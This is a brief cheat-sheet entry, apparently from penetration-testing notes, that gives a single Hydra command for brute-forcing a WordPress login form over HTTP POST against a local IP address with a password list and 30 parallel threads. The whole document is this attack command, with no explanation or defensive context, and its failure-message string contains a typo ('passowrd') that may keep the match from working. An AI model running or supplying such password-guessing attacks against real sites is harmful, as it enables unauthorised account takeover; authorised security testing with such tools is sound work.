#### Hydra HTTP-POST Bruteforcing Commands
```
hydra -l username -P <password_list> 192.168.1.1 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The passowrd you entered for the username" -t 30
```
